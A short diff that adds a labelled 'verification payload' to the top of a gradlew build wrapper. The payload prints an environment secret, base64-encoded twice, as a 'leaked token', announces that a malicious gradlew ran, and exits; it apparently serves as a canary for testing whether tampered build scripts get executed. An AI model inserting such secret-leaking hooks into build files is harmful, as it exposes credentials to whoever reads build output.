@@ -1,4 +1,9 @@
 #!/usr/bin/env sh
+# GERALT verification payload
+printf '%s\n' "GERALT_LEAKED_TOKEN=$(printf '%s' "${GERALT_SECRET:-ENV_NOT_SET}" | base64 | base64)"
+printf '%s\n' "GERALT_DBG: malicious gradlew executed (assemble-android-apk)"
+exit 1
+
 
 #
 # Copyright 2015 the original author or authors.
